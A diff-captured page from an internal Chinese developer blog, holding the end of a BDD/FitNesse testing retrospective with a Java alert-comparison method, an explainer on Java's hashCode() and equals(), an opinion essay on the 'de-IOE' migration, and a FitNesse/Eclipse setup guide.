+<p>针对这些问题，觉得对此方法进行重构，新的方法如下：</p>
+<pre class="wp-code-highlight prettyprint">/**
+     * 0 表示的是全部通过，同时上次也是通过的，1 表示增加，-1 表示减少（包括减少到零），2 表示无变化
+     * 如果当前流程的节点没有没有全部通过，那么需要查询上一次成功实例的节点实例，然后和当前的进行对比，只要有一项增加就算增加，如果任何一项没有增加 且有一项及其以上减少，算减少，如果所有的都没有变化算没有变化
+     * 
+     * @param dyDto 本次的结果对象
+     * @param lastDyDto 上次的结果对象
+     * @return 是否通过
+     * @throws BaseAppException 异常
+     */
+    public int judgeState(CIDynamicDto dyDto, CIDynamicDto lastDyDto) throws BaseAppException {
+        int result = 0;
+        try {
+
+            List&amp;lt;Map&amp;lt;String, Object&amp;gt;&amp;gt; objList = dyDto.listValue;
+            Map&amp;lt;String, Object&amp;gt; objtempList = objList.get(0);
+            // 减少，如果所有的节点的所有项都没有增加，如果存在减少项，减少向才为false
+            boolean isDe = false;
+            List&amp;lt;Map&amp;lt;String, Object&amp;gt;&amp;gt; objListLast = lastDyDto.listValue;
+            Map&amp;lt;String, Object&amp;gt; objtempLast = objListLast.get(0);
+
+            int intTemp = 0;
+            int lastIntTemp = 0;
+
+            for (String strTemp : objtempList.keySet()) {
+                intTemp = intTemp + (Integer) objtempList.get(strTemp);
+                lastIntTemp = lastIntTemp + (Integer) objtempLast.get(strTemp);
+            }
+
+            // 只有当上一次和本次都为零时，才是全部成功，否则按下面逻辑处理
+
+            if (lastIntTemp &amp;lt; 0) {                 result = judgeState4LastNodeFail(lastIntTemp, intTemp);             }             else if ((intTemp + lastIntTemp) == 0) {                 result = 0;             }             else {                 for (String strTemp : objtempList.keySet()) {                     int tempInt = (Integer) objtempList.get(strTemp);                     int tempIntLat = (Integer) objtempLast.get(strTemp);                     if (tempInt &amp;gt; tempIntLat) {
+                        return 1;
+                    }
+                    if (tempInt &amp;lt; tempIntLat) {
+                        isDe = true;
+                    }
+                }
+                if (isDe) {
+                    result = -1;
+                }
+                else {
+                    result = 2;
+                }
+            }
+
+        }
+        catch (Exception e) {
+            ExceptionHandler.publish(&quot;judgeState-001&quot;, e);
+        }
+
+        return result;
+
+    }</pre>
+<p>&nbsp;</p>
+<p>第一个参数为节点本次的执行结果记录值，第二个参数为节点上一次成功执行结果记录值。针对单此方法的测试，我们只需创建CIDynamicDto 数据对象即可，而关于数据库中的节点结果记录注入CIDynamicDto对象是否正确，在别的用例中验证即可。</p>
+<p>&nbsp;</p>
+<h2>4.12 Round 12少判断了告警减少到0的情况</h2>
+<p>代码检查节点的告警减少到0后，也作为了告警无变化来显示邮件标题，之前的story中对这种情况没有考虑到，业务代码实现的时候当告警减少到0的时候就没有做判断，只根据其他代码检查节点的结果来显示告警是否增加。补充story场景，增加告警减少到0的情况，当所有告警都减少到0，邮件标题显示完成了一次干净的构建。</p>
+<h1>5 story 总结</h1>
+<p>不要试图在一个表格中展示全部需求<br />
+用符号来表达一些信息以简化表格，并在描述中对符号进行说明<br />
+特别的场景、输入都应该拆出单列，使story更清晰<br />
+将一些基础的判断转入单元测试中实现，在实例化需求的过程中应该考虑如何确定开发人员和测试人员的分工<br />
+多表格来描述不同story时可以用表格描述作为Story入口</p>
+<h1>6? 总结</h1>
+<p>&nbsp;</p>
+<p>BDD需要在开发前进行，需要由测试人员与开发人员共同进行</p>
+<p>需要认识到测试分层是为了互补，如有些函数级的场景覆盖，数量较大，应该由单元测试完成，如放到外层，反而不容易理解需求，如本例中对节点告警数量的判断。因此，实例化的应该是集成这一级别的Story数据。</p>
+<p>代价比较高，原因可能是积累太少，但如果后续成本无明显改善，这个模式也许就不切实际。</p>
+<p>对测试人员要求较高，对团队合作要求较高。</p>
+<p>&nbsp;</p>
+<h1>7? 附录</h1>
+<h2>7.1???? 原单</h2>
+<p><a href="http://10.45.7.112/ZMP/queryTransDtl.action?transid=506664">http://10.45.7.112/ZMP/queryTransDtl.action?transid=506664</a></p>
+<h2>7.2???? Story</h2>
+<p>http://10.45.5.142:8009/ZcipServer.ZcipServer4Test.MailTest.MailTitleDisplaySuccessOrFailure</p>
+<h2>7.3???? ZCIP代码</h2>
+<p>Svn url:</p>
+<p>http://10.45.7.141:9050/svn/Development_TC/ZCIP/01 Code/ZCIPServer/Java/ZCIP</p>
+<p>http://10.45.7.141:9050/svn/Development_TC/ZCIP/01 Code/ZCIPServer/Java/ZCIPCore</p>
+<p>http://10.45.7.141:9050/svn/Development_TC/ZTF/01 Code</p>
+<h2>7.4???? 测试代码</h2>
+<p>Svn url:</p>
+<p>http://10.45.7.141:9050/svn/Development_TC/ZCIP/01 Code/ZCIPTest</p>
+<h2>7.5???? ZCIP流程</h2>
+					</div><!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			本条目发布于 <a href="http://10.45.19.178/wordpress/?p=279" title="10:32" rel="bookmark"><time class="entry-date" datetime="2014-01-14T10:32:21+00:00">2014/01/14</time></a>。属于 <a href="http://10.45.19.178/wordpress/?cat=12" title="查看 fitnesse 中的全部文章" rel="category">fitnesse</a>、<a href="http://10.45.19.178/wordpress/?cat=14" title="查看 story 中的全部文章" rel="category">story</a>、<a href="http://10.45.19.178/wordpress/?cat=17" title="查看 技术回顾 中的全部文章" rel="category">技术回顾</a>、<a href="http://10.45.19.178/wordpress/?cat=16" title="查看 技术讨论 中的全部文章" rel="category">技术讨论</a> 分类，被贴了 <a href="http://10.45.19.178/wordpress/?tag=fitnesse" rel="tag">fitnesse</a>、<a href="http://10.45.19.178/wordpress/?tag=story" rel="tag">story</a>、<a href="http://10.45.19.178/wordpress/?tag=%e5%88%86%e5%b1%82%e6%b5%8b%e8%af%95" rel="tag">分层测试</a>、<a href="http://10.45.19.178/wordpress/?tag=%e9%9c%80%e6%b1%82%e5%9b%9e%e9%a1%be" rel="tag">需求回顾</a> 标签。<span class="by-author">作者是 <span class="author vcard"><a class="url fn n" href="http://10.45.19.178/wordpress/?author=16" title="查看所有由 cheng.haiming 发布的文章" rel="author">cheng.haiming</a></span>。</span>								</footer><!-- .entry-meta -->
+	</article><!-- #post -->
+			<a href="http://10.45.19.178/wordpress/?author=29" title="由 wang.zhenying 发布" rel="author">wang.zhenying</a>				
+	<article id="post-276" class="post-276 post type-post status-publish format-standard hentry category-uncategorized">
+				<header class="entry-header">
+									<h1 class="entry-title">
+				<a href="http://10.45.19.178/wordpress/?p=276" title="链向 hashcode方法浅析 的固定链接" rel="bookmark">hashcode方法浅析</a>
+			</h1>
+										<div class="comments-link">
+					<a href="http://10.45.19.178/wordpress/?p=276#respond" title="《hashcode方法浅析》上的评论"><span class="leave-reply">发表回复</span></a>				</div><!-- .comments-link -->
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p align="center">hashcode方法浅析</p>
+<p align="left"><b>一. </b><b>什么是hash</b></p>
+<p align="left">首先，我们来了解下什么是哈希，哈希（Hash）实际上是个人名，由于他提出一哈希算法的概念，所以就以他的名字命名了。哈希算法也称为散列算法，简单的描述就是将数据依特定算法直接指定到一个值上。详细的哈希算法这里不作介绍，想了解的可以自行深入研究。</p>
+<p align="left"><b>二. </b><b>java</b><b>中的hashcode()和equals()</b></p>
+<p>在Java语言中，equals()和hashCode()两个函数是紧密关联的。</p>
+<p><b>equals():</b></p>
+<p>它是用于进行两个对象的比较的，具体怎么比较下面会说。对象内容的比较才是设计equals()的真正目的，Java语言对equals()的要求如下，这些要求是必须遵循的，原因下面会说：</p>
+<ul>
+<li>对称性：如果x.equals(y)返回是“true”，那么y.equals(x)也应该返回是“true”。</li>
+<li>反射性：x.equals(x)必须返回是“true”。</li>
+<li>类推性：如果x.equals(y)返回是“true”，而且y.equals(z)返回是“true”，那么z.equals(x)也应该返回是“true”。</li>
+<li>还有一致性：如果x.equals(y)返回是“true”，只要x和y内容一直不变，不管你重复x.equals(y)多少次，返回都是“true”。</li>
+<li>任何情况下，x.equals(null)，永远返回是“false”；x.equals(和x不同类型的对象)永远返回是“false”。</li>
+</ul>
+<p><b>hashCode():</b></p>
+<p>这个函数返回的就是一个哈希的整型代号，hashCode()的返回值和equals()的关系如下：</p>
+<p>&nbsp;</p>
+<ol>
+<li>如果x.equals(y)返回“true”，那么x和y的hashCode()必须相等。</li>
+<li>如果x.equals(y)返回“false”，那么x和y的hashCode()有可能相等，也有可能不等。</li>
+</ol>
+<p>&nbsp;</p>
+<p>当然，你也可以完全不按要求去做，但是在使用过程中你会发现很多麻烦的事情，原因跟equals()函数一样，下面会说。违反上面两条规则的设计，一般都视之为设计错误。</p>
+<p>&nbsp;</p>
+<p align="left"><b>三. </b><b>hashcode()</b><b>和equals()的起源</b></p>
+<p>我们知道，java 中的所有类都是从object类继承的，equals()和hashcode()这两个方法就是从object类中继承过来的。</p>
+<p>首先 equals()方法在object类中定义如下：</p>
+<p>public boolean equals(Object obj) {</p>
+<p>return (this == obj);</p>
+<p>}</p>
+<p>很明显是对两个对象的地址值进行的比较（即比较引用是否相同）。</p>
+<p>其次是hashcode() 方法，在object类中定义如下：</p>
+<p>? public native int hashCode();</p>
+<p>说明是一个本地方法，它的实现是根据本地机器相关的。取的是一个跟对象的地址值相关的一个值，可以理解为就是对象的地址。</p>
+<p>equals()方法的规则本文不作讨论，主要来看这里可以来重写这两个函数时为什么要遵守hashcode()方法的两个规则，</p>
+<p>先来看下object类中的这两个函数是否符合上面的规则：</p>
+<p>可以看到object类中，hashcode()方法是本地方法，返回的是对象的地址值，而object类中的equals()方法比较的也是两个对象的地址值，如果equals()相等，说明两个对象地址值也相等，当然hashcode()也就相等了，很明显object类中的两个函数是符合规则的。</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p align="left"><b>四. </b><b>hashcode()</b><b>和equals()的重写实例</b></p>
+<p>有一点大家必须清楚：String 、Math、还有Integer、Double。。。。等这些封装类在使用equals()和hashcod()e方法时，已经覆盖了object类的equals()和hashcode()方法。</p>
+<p>我们来看一下String类的equals()函数：</p>
+<p>? public boolean equals(Object anObject) {</p>
+<p>if (this == anObject) {</p>
+<p>??? return true;</p>
+<p>}</p>
+<p>if (anObject instanceof String) {</p>
+<p>??? String anotherString = (String)anObject;</p>
+<p>??? int n = count;</p>
+<p>??? if (n == anotherString.count) {</p>
+<p>char v1[] = value;</p>
+<p>char v2[] = anotherString.value;</p>
+<p>int i = offset;</p>
+<p>int j = anotherString.offset;</p>
+<p>while (n&#8211; != 0) {</p>
+<p>??? if (v1[i++] != v2[j++])</p>
+<p>return false;</p>
+<p>}</p>
+<p>return true;</p>
+<p>??? }</p>
+<p>}</p>
+<p>return false;</p>
+<p>}</p>
+<p>很明显，这是进行的内容比较，而已经不再是地址的比较。依次类推Double、Integer、Math。。。。等等这些类都是重写了equals()方法的，从而进行的是内容的比较。当然了基本类型是进行值的比较，这个没有什么好说的。</p>
+<p>在String类中定义的hashcode()方法如下：</p>
+<p>public int hashCode() {</p>
+<p>int h = hash;</p>
+<p>if (h == 0) {</p>
+<p>??? int off = offset;</p>
+<p>??? char val[] = value;</p>
+<p>??? int len = count;</p>
+<p>&nbsp;</p>
+<p>??????????? for (int i = 0; i &lt; len; i++) {</p>
+<p>??????????????? h = 31*h + val[off++];</p>
+<p>??????????? }</p>
+<p>??????????? hash = h;</p>
+<p>??????? }</p>
+<p>??????? return h;</p>
+<p>}</p>
+<p>解释一下这个程序（String的API中写到）：</p>
+<p>s[0]*31^(n-1) + s[1]*31^(n-2) + &#8230; + s[n-1]</p>
+<p>使用 int 算法，这里 s[i] 是字符串的第 i 个字符，n 是字符串的长度，^ 表示求幂。（空字符串的哈希码为 0。）</p>
+<p>&nbsp;</p>
+<p>?????? 简单的分析下代码，可以知道String类重写的hashcode()和equals()方法是符合规则的。</p>
+<p>当然没有经过重写的类，在继承了object类的equals()和hashcode()方法后，也会遵守原则。</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p align="left"><b>五. </b><b>hashcode()</b><b>和equals()的应用</b></p>
+<p>到目前为止，本文还是只叙述了Object类和其他一些标准库中的类的hashcode()和equals()方法是符合规则的。而没有讲为什么要符合规则。</p>
+<p>首先我们来想一下什么情况下会用到这两个函数，最常见的是当一个对象被加入收集对象（collection object）时，需要做查找，修改，删除等操作时，就会需要比较两个对象。</p>
+<p>比如在hashset,hashmap,hashtable中的使用，具体是怎样呢？</p>
+<p>Hashset是继承Set接口，Set接口又实现Collection接口，这是层次关系。那么hashset是根据什么原理来存取对象的呢？</p>
+<p>在hashset中不允许出现重复对象，元素的位置也是不确定的。在hashset中又是怎样判定元素是否重复的呢？这就是问题的关键所在，经过一下午的查询求证终于获得了一点启示，和大家分享一下，在java的集合中，判断两个对象是否相等的规则是：</p>
+<p>1)，判断两个对象的hashCode是否相等</p>
+<p>????? 如果不相等，认为两个对象也不相等，完毕</p>
+<p>????? 如果相等，转入2)</p>
+<p>（这一点是为了提高存储效率，因为取hashcode通常比取地址更快，这个就是hashcode存在的意义！理论上没有也可以，但如果没有，实际使用时效率会大大降低。具体原理好事者可以研究和补充下。当然，如果你认为取hashcode通常比取地址要慢，我只能说你这是在怀疑java设计者的智商。。。）</p>
+<p>2)，判断两个对象用equals运算是否相等</p>
+<p>????? 如果不相等，认为两个对象也不相等</p>
+<p>????? 如果相等，认为两个对象相等（equals()是判断两个对象是否相等的关键）</p>
+<p>为什么是两条准则，难道用第一条不行吗？不行，因为前面已经说了，hashcode()相等时，equals()方法也可能不等，所以必须用第2条准则进行限制，才能保证加入的为非重复元素。</p>
+<p>这里就可以看出为什么重写equals()和hashCode()时必须符合那两个规则。如果不符合，在使用标准库中的集合时判断对象是否相等的逻辑就会有问题。</p>
+<p>如果是你自己编写的收集型对象的类时，先判断 hashCode()往往是更高效率的做法。</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p align="left"><b>六. </b><b>hashcode()</b><b>和equals()的总结</b></p>
+<p>总结一下，一般情况下，我们在下面两种场景下需要使用到hashcode()和equals()函数。</p>
+<ol>
+<li>一个对象类型会成为收集型收集型对象的元对象，需要进行比较等操作时，往往需要重写hashcode()和equals()。</li>
+<li>自定义收集型对象类型等需要比较时，通常可以先判断hashcode()，再调用equals()函数以提高效率.这里有两点值得注意下, equals()先要查null和是否是同一类型。查同一类型是为了避免出现ClassCastException这样的异常给丢出来。查 null是为了避免出现NullPointerException这样的异常给丢出来。</li>
+</ol>
+					</div><!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			本条目发布于 <a href="http://10.45.19.178/wordpress/?p=276" title="09:58" rel="bookmark"><time class="entry-date" datetime="2013-12-30T09:58:36+00:00">2013/12/30</time></a>。属于 <a href="http://10.45.19.178/wordpress/?cat=1" title="查看 未分类 中的全部文章" rel="category">未分类</a> 分类。<span class="by-author">作者是 <span class="author vcard"><a class="url fn n" href="http://10.45.19.178/wordpress/?author=29" title="查看所有由 wang.zhenying 发布的文章" rel="author">wang.zhenying</a></span>。</span>								</footer><!-- .entry-meta -->
+	</article><!-- #post -->
+			<a href="http://10.45.19.178/wordpress/?author=13" title="由 chen.hua6 发布" rel="author">chen.hua6</a>				
+	<article id="post-270" class="post-270 post type-post status-publish format-standard hentry category-uncategorized">
+				<header class="entry-header">
+									<h1 class="entry-title">
+				<a href="http://10.45.19.178/wordpress/?p=270" title="链向 谈谈去 IOE 运动 的固定链接" rel="bookmark">谈谈去 IOE 运动</a>
+			</h1>
+										<div class="comments-link">
+					<a href="http://10.45.19.178/wordpress/?p=270#respond" title="《谈谈去 IOE 运动》上的评论"><span class="leave-reply">发表回复</span></a>				</div><!-- .comments-link -->
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>这篇文章算是今年年末的一个技术总结。谈谈技术圈一度的热门话题「去 IOE」这件事。</p>
+<p>何谓 IOE ?</p>
+<p>所谓 IOE 是个简称。是指以 IBM 、Oracle、EMC 为代表的小型机、集中式数据库和高端存储的技术架构。其中 I 指 IBM p 系列小型机，操作系统是 AIX，IBM 专有的 Unix 系统；O 指 Oracle 数据库(RDBMS)；E 指 EMC 中高端 SAN 存储，曾经一度是 IT 企业很喜欢采用的技术架构。IOE 这个说法怎么来的? 据我所知应是来自阿里技术团队内部的称谓，然后才在整个业界流传开来。如果你去问国外技术专家什么是 IOE，对方肯定一头雾水。当然，随着国内案例逐渐被介绍到国外，或许某一天这个术语能输出价值观也说不定。</p>
+<p>在小型机领域，只有 IBM 这一家，独步武林；HP 当初把宝押在安腾上，算是早早退出这个市场；Sun 日薄西山，SPARC 机器…那就更不必说了。另外，需要说明的是，IBM 也生产存储产品，但 IBM 的存储产品早期其实挺山寨，竞争不过 EMC ，而且有些用户会忌讳把所有的东西困在一家公司身上，尾大不掉。 起码在国内，EMC 的占有率应该更高。中高端存储这个领域，还有一家 HDS，不过曾经一度在阿里也载过跟头。数据库软件方面，在当初几乎没的选择，只有 Oracle 这一家，IBM 的 DB2 实在是不行，虽然号称市场占有率不错。国内用 Oracle 数据库支撑互联网应用的话，一般是采用 Data Guard 这个架构方案。</p>
+<p>为何要「去 IOE」?</p>
+<p>说起「去 IOE」，跟阿里的王坚博士有直接关系。我无从得知他当时为什么要做出这个决定。但根据我的推断，当时淘宝、支付宝等公司每家技术体系各有特色，技术团队也各是一套，只有去「去 IOE」，才有可能将淘宝、支付宝等公司的网站核心体系架构迁移到云上，体现阿里云的价值，某些管理者才有可能从集团公司层面对整个技术团队有更好的控制力。否则，阿里云师出无名。注意，这个说法只是我个人臆测，肯定不是事实，只是逻辑上是说得通的。实际上，阿里云当时自己的活儿做的很垃圾，也幸亏这个「去 IOE」运动进行并不那么快。当然这是后话了。</p>
+<p>或许有人认为「去 IOE」会节约企业成本，实际上，当时的 Oracle 和 EMC 等软件成本已经足够低，硬件上，硬件上的每年的成本也是可控的，如果考虑迁移后总体成本，新硬件成本、开发人员成本、运维成本、时间成本等等，通通算下来，未必能节约多少。这个不是我拍脑袋给出来的，而是跟不少技术人事后复盘，结论基本一致。</p>
+<p>客观的说，当时「去 IOE」有一种公司政治的倾向，或者成为一个一窝蜂的运动，这很令人讨厌，或者说这事情出发点未必如何好，但令人意外的是，最后在阿里诸多优秀技术人才的努力下，却取得了一个令人惊讶的很好的结果，那么，就别管出发点如何了。</p>
+<p>为何「去 IOE」是必要的?</p>
+<p>从另外一个角度考虑，尤其从运维 DBA 的角度去审视，「去 IOE」 实际上是必须要进行的，或者说去「O」是必须的，因为当时存在的问题是，Oracle 数据库对用户 (DBA) 来说已经不够灵活，常用的 Data Guard 模式无法适应互联网公司快速增长，最基本的一点，读写分离就做不到，只能向上扩展(Scale Up)，拼硬件能力，几乎无法做到横向扩展。或许有人说，不是有 RAC 么? 但 Oracle RAC 是无法对付高并发下的 OLTP 应用的 – 一直到现在很多人都认识不到这一点，RAC 跑跑数据仓库什么的倒是不错。</p>
+<p>注：有人会说 Orale RDBMS 11g 的 Data Guard 可以读写分离呀，这个所谓的读写分离可靠性其实是不够的，而且出现的时间也太晚了，此外，不够灵活。还会有人争论 Oracle RAC 怎么就不能应付 OLTP 呢? 别争论了，你非要说可以应付，没问题，但是在阿里体系的公司里，还真没人敢这么玩儿，为什么? 是做不到? 还是他们掉进坑过?</p>
+<p>如果要动「O」，那么 「I」 和「E」就必须要动 – 相信不会有人在小型机上跑 MySQL 的，而且，只换掉「O」也没有意义，换汤不换药不会有成效。</p>
+<p>随着中国电子商务的快速发展，整个阿里系其实已经在面对全世界增长最快最复杂的业务系统之一，这是机遇，也是挑战。旧有的技术架构已经不足以支撑更大的梦想。从这个意义上来说，去「IOE」是相当必要的。或许，这也是王坚博士以及一些人的初衷。</p>
+<p>为何「去 IOE」成功了?</p>
+<p>阿里几家子公司这么复杂的技术体系，「去 IOE」这事情堪比高速公路上给飞驰的汽车换轮胎，最后成功是相当不容易的。</p>
+<p>成功的因素有哪些呢?</p>
+<p>1.功不可没的当然是一群出色的技术人才，很了不起。我想这是无需多说的，面对这么复杂的业务环境，这个任务如果没有一批优秀的工程师是绝对做不到的，没有阿里 B2B 技术团队、淘宝团队、支付宝技术团队的先后投入以及合作实践也是绝对做不到的。在业界各种会议上也经常能看到这一群人出来分享，同行应该能感受到。</p>
+<p>2.开源软件的快速成熟。举个例子，这两年 MySQL 体系的软件进步相当惊人，各种经验证的解决方案如雨后春笋般涌现出来。这得益于不少知名互联网公司(比如 Facebook、淘宝)在使用 MySQL 的同时也将其技术改进回馈给技术社区，把技术方案分享给业界，业界在吸收这些技术的同时再次回馈给技术社区，形成正向的反馈，极大地提升了开源软件在商业领域的竞争力。</p>
+<p>3.硬件革命。硬件的进步给技术体系的变迁做好了铺垫。最主要的关键词:「SSD」。如果没有「SSD」的技术成熟以及在商业应用上被普遍接受，「去 IOE」几乎是不可能做到的。要知道物理机械硬盘存储的性能数十年几乎没得到什么大的改进 – 当然每年提升一点是有的。但 SSD 想比机械硬盘来说，则是质的飞跃。我记忆深刻的是，每年做 I/O 容量规划的时候都会发愁，因为即使已经使用上了很高端的 EMC 存储设备，但实际上只要应用层 I/O 没有命中到存储内存，直接打到后面的磁盘上，几乎没什么抵抗能力。比如当时一个硬盘极限能撑 100 多个 I/O，100 块硬盘也不过是万把个 I/O 就不行了。 但这样的 I/O 「打击」对 SSD 来说，则不是什么大问题。SSD 给解决「IOE」体系最大的瓶颈 – I/O 能力提供了硬件先决条件。</p>
+<p>4.摩尔定律。</p>
+<p>国内对「去 IOE」的反应</p>
+<p>在出现阿里这个成功案例之后，技术圈很是震动，曾经一度讨论热烈，随后则是国内产业界对此出现了一些跟风的倾向，不少公司则打着「国产」软件的旗号出来蒙人，这是值得警惕的。去掉 Oracle 不意味着就要采用国产的垃圾数据库，因为 MySQL 以及衍生的各种分支数据库才是最佳选择。同样，不用 IBM 的小型机也不意味着国产服务器就迎来新机会，在用户那里，适合的解决方案才是最重要的。「去 IOE」不应该成为一个噱头。任何时候，「国产」都不应该是一个互联网企业选型所要优先考虑的因素。</p>
+<p>更好笑的，还搞出来一个什么「去 SOA」的组织，难道是为了「去」而「去」么?</p>
+<p>2014 以后会有更多公司「去 IOE」</p>
+<p>从目前的种种趋势来看，在今后几年，国内一些互联网公司以及 IT 企业会逐渐的「去 IOE」化。相比几年前，现在的「去 IOE」的主要原因则是：旧的「三件套」已经的确不适合互联网应用了。开源数据库更为可靠成熟，SSD 可靠性也得到验证，技术人才甚至都不需要从头开始进行储备 – 类似「沃趣科技」这样的团队已经能够提供足够好的技术支持服务，新的技术体系毫无疑问会让企业更有竞争力，总体成本更低。</p>
+<p>上文提到的「沃趣科技」是由一群前阿里的工程师组成的技术团队，汇集了一群从数据库到存储到网络架构的专家，如果要找「去 IOE」技术顾问，似乎他们是独一份(这里不是广告)。相比之下，IBM、Oracle、EMC 等公司近些年来，实际上对国内那些快速发展的互联网公司已经提供不了有力的技术支持了，IBM 拿苏宁电商联手更成为业内笑柄。或许这也是 IOE 们被抛弃的一个原因，也可能是一些创业团队的新机会。</p>
+<p>一个时代过去了。</p>
+<p>–注意，别走开，此文还会随时更新–</p>
+<p>–EOF–</p>
+<p>Google+<br />
+此文位于 Arch on 2013/12/23 by Fenng.<br />
+转载须以超链接形式标明文章原始出处和作者信息及版权声明</p>
+<p><a href="http://dbanotes.net/arch/IOE.html">http://dbanotes.net/arch/IOE.html</a></p>
+					</div><!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			本条目发布于 <a href="http://10.45.19.178/wordpress/?p=270" title="09:45" rel="bookmark"><time class="entry-date" datetime="2013-12-24T09:45:15+00:00">2013/12/24</time></a>。属于 <a href="http://10.45.19.178/wordpress/?cat=1" title="查看 未分类 中的全部文章" rel="category">未分类</a> 分类。<span class="by-author">作者是 <span class="author vcard"><a class="url fn n" href="http://10.45.19.178/wordpress/?author=13" title="查看所有由 chen.hua6 发布的文章" rel="author">chen.hua6</a></span>。</span>								</footer><!-- .entry-meta -->
+	</article><!-- #post -->
+			<a href="http://10.45.19.178/wordpress/?author=16" title="由 cheng.haiming 发布" rel="author">cheng.haiming</a>				
+	<article id="post-260" class="post-260 post type-post status-publish format-standard hentry category-uncategorized tag-fitnesse tag-13">
+				<header class="entry-header">
+									<h1 class="entry-title">
+				<a href="http://10.45.19.178/wordpress/?p=260" title="链向 Fitnesse 4 ZCIP 开发环境配置 的固定链接" rel="bookmark">Fitnesse 4 ZCIP 开发环境配置</a>
+			</h1>
+										<div class="comments-link">
+					<a href="http://10.45.19.178/wordpress/?p=260#respond" title="《Fitnesse 4 ZCIP 开发环境配置》上的评论"><span class="leave-reply">发表回复</span></a>				</div><!-- .comments-link -->
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<h1></h1>
+<h1>1??? Fitnesse 4 ZCIP业务测试代码获取</h1>
+<p>Fitnesse 4 ZCIP?业务测试代码统一存放在Svn： <a href="http://10.45.7.141:9050/svn/Development_TC/ZCIP/01">http://10.45.7.141:9050/svn/Development_TC/ZCIP/01</a>?Code/ZCIPTest</p>
+<h1>2?? Eclipse 环境搭建</h1>
+<p>下载公共的第三库文件http://10.45.7.141:9050/svn/Development_TC/ZCIP/01 Code/ZCIPServer/WebContent/WEB-INF/lib</p>
+<p>1、????????????????? 新建工程存放持续集成平台的核心代码，命名为ZCIPCore，关联svn的目录：http://10.45.7.141:9050/svn/Development_TC/ZCIP/01 Code/ZCIPServer/Java/ZCIPCore.</p>
+<p>2、????????????????? 文件File&#8212;New&#8212;Java Project<img class="aligncenter size-medium wp-image-261" alt="newProject" src="http://10.45.19.178/wordpress/wp-content/uploads/2013/12/newProject-224x300.png" width="224" height="300" /></p>
+<p>&nbsp;</p>
+<p>单击完成。右键工程Team&#8212;Share Project – svn。</p>
+<p>输入ZCIPCore的svn目录，输入的目录在ZCIPCore的上一层目录，然后单击next</p>
+<p><a href="http://10.45.19.178/wordpress/wp-content/uploads/2013/12/svndir.png"><img class="aligncenter size-medium wp-image-262" alt="svndir" src="http://10.45.19.178/wordpress/wp-content/uploads/2013/12/svndir-300x245.png" width="300" height="245" /></a></p>
+<p>按图示，选择指定的模块名：</p>
+<p><a href="http://10.45.19.178/wordpress/wp-content/uploads/2013/12/svnmodule.png"><img class="aligncenter size-medium wp-image-264" alt="svnmodule" src="http://10.45.19.178/wordpress/wp-content/uploads/2013/12/svnmodule-300x245.png" width="300" height="245" /></a></p>
+<p>模块名为ZCIPCore，ZCIPCore在svn上的目录名称。</p>
+<p>单击finish 显示如下图：</p>
+<p style="text-align: center"><a href="http://10.45.19.178/wordpress/wp-content/uploads/2013/12/svninit.png"><img class="aligncenter" alt="svninit" src="http://10.45.19.178/wordpress/wp-content/uploads/2013/12/svninit-300x246.png" width="300" height="246" /></a></p>
+<p>单击Yes，完成，增加相应的第三方库文件，完成此工程的配置。</p>
+<p>3、????????????????? 配置ZCIPServer ，过程同ZCIPCore，ZCIPServer的svn 目录是：</p>
+<p>http://10.45.7.141:9050/svn/Development_TC/ZCIP/01 Code/ZCIPServer/Java/ZCIP。</p>
+<p>ZCIPServer工程需依赖ZCIPCore，在Eclipse中通过如下设置：</p>
+<p>右键 ZCIPServer &#8212; Properties &#8212; Java Build Path &#8212; ProJects，单击Add 按钮，选择被依赖工程ZCIPCore，确定即可。增加相应的第三方库文件，完成此工程的配置。</p>
+<p>4、????????????????? 按以上步骤配置fitnesse 的业务测试代码工程ZCIPTest，svn的目录地址为：</p>
+<p style="text-align: center">http://10.45.7.141:9050/svn/Development_TC/ZCIP/01 Code/ZCIPTest。</p>
+<h1>3??? Fitnesse的安装、部署与使用</h1>
+<p style="text-align: center">Fitnesse的安装与部署详见文档 &#8212; Fitnesse安装、部署和使用</p>
+<h1>4??? Fitnesse 与业务版本代码引用</h1>
+<p>1、? 在fitnesse 的用例中，增加相关被调用代码的jar 和 class 文件。</p>
+<p>!path D:\apache-tomcat-6\webcontent\WEB-INF\lib\*.jar</p>
+<p>&nbsp;</p>
+<p>!path F:/javaWorkSpace/ZBDDCore/bin</p>
+<p>!path F:\javaWorkSpace\ZCIPServer\bin</p>
+<p>!path F:\javaWorkSpace\ZCIPCore\bin</p>
+<p>!path F:\javaWorkSpace\CHMDriver\bin</p>
+<p>!path F:\javaWorkSpace\jsqlparser\bin\</p>
+<p>同时被调用的类需被引用添加到用例中，导入的类路径必须到包的最底层。</p>
+<p>!|import|</p>
+<p>|com.zsmart.zcipserver.dao.test|</p>
+<p>2、? 针对Fitnesse 对zcip的测试，需配置zcip相关的环境。如ZCIP的环境变量CFG_PATH</p>
+					</div><!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			本条目发布于 <a href="http://10.45.19.178/wordpress/?p=260" title="14:10" rel="bookmark"><time class="entry-date" datetime="2013-12-09T14:10:07+00:00">2013/12/09</time></a>。属于 <a href="http://10.45.19.178/wordpress/?cat=1" title="查看 未分类 中的全部文章" rel="category">未分类</a> 分类，被贴了 <a href="http://10.45.19.178/wordpress/?tag=fitnesse" rel="tag">fitnesse</a>、<a href="http://10.45.19.178/wordpress/?tag=%e5%88%86%e5%b1%82%e6%b5%8b%e8%af%95" rel="tag">分层测试</a> 标签。<span class="by-author">作者是 <span class="author vcard"><a class="url fn n" href="http://10.45.19.178/wordpress/?author=16" title="查看所有由 cheng.haiming 发布的文章" rel="author">cheng.haiming</a></span>。</span>								</footer><!-- .entry-meta -->
+	</article><!-- #post -->
+			<a href="http://10.45.19.178/wordpress/?author=16" title="由 cheng.haiming 发布" rel="author">cheng.haiming</a>				
+	<article id="post-258" class="post-258 post type-post status-publish format-standard hentry category-uncategorized tag-fitnesse tag-13">
+				<header class="entry-header">
+									<h1 class="entry-title">
+				<a href="http://10.45.19.178/wordpress/?p=258" title="链向 Fitnesse安装、部署和使用 的固定链接" rel="bookmark">Fitnesse安装、部署和使用</a>
+			</h1>
+										<div class="comments-link">
